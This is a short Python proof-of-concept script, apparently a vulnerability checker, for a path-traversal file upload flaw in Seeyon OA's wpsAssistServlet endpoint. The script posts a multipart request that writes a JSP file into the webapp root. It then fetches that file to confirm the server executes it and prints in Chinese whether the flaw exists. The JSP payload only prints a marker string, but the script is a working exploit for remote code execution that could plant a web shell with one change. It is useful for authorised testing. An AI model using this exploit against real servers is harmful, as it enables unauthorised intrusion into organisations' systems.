#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/vulntest.jsp&fileId=2"
    burp0_headers = {"Content-Type": "multipart/form-data; boundary=WebKitFormBoundaryjsjtvysn", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"}
    burp0_data = "--WebKitFormBoundaryjsjtvysn\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"123.xls\"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n<% out.println(\"Vulntest\");%>\r\n--WebKitFormBoundaryjsjtvysn--"
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    shellpath = site + "/vulntest.jsp"
    req = requests.get(shellpath,  verify=False)
    if req.status_code == 200 and "Vulntest" in req.text:
        return shellpath
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传后的路径为：", info)
    else:
        print("[-]漏洞不存在")
